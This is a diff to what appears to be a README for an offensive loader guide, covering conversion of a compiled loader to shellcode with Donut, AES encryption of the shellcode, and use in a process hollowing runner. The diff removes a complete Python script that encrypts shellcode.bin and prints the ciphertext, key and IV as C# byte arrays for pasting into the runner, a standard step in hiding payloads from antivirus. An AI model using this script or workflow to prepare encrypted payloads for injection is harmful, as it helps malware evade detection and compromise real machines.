@@ -45,36 +45,7 @@ Use [Donut](https://github.com/TheWover/donut) to convert the compiled loader in
 
 ## 🔐 Step 3 - AES Encrypt the Shellcode
 
-Use this Python script to AES-encrypt the generated shellcode and format the output as C# byte arrays for easy pasting:
-
-```python
-from Crypto.Cipher import AES
-from Crypto.Random import get_random_bytes
-import pyperclip
-
-with open("shellcode.bin", "rb") as f:
-    raw_shellcode = f.read()
-
-key = get_random_bytes(32)
-iv = get_random_bytes(16)
-pad_len = 16 - (len(raw_shellcode) % 16)
-padded_shellcode = raw_shellcode + bytes([pad_len] * pad_len)
-
-cipher = AES.new(key, AES.MODE_CBC, iv)
-encrypted = cipher.encrypt(padded_shellcode)
-
-def format_csharp_array(name, byte_data):
-    return f"byte[] {name} = new byte[] {{ {', '.join(f'0x{b:02x}' for b in byte_data)} }};"
-
-output = (
-    format_csharp_array("encryptedShellcode", encrypted) + "\n\n" +
-    format_csharp_array("aesKey", key) + "\n\n" +
-    format_csharp_array("aesIV", iv)
-)
-
-pyperclip.copy(output)
-print("[+] C# arrays generated and copied to clipboard.")
-```
+Use the Python script to AES-encrypt the generated shellcode.
 
 Paste the generated arrays into your Process Hollowing runner.
 
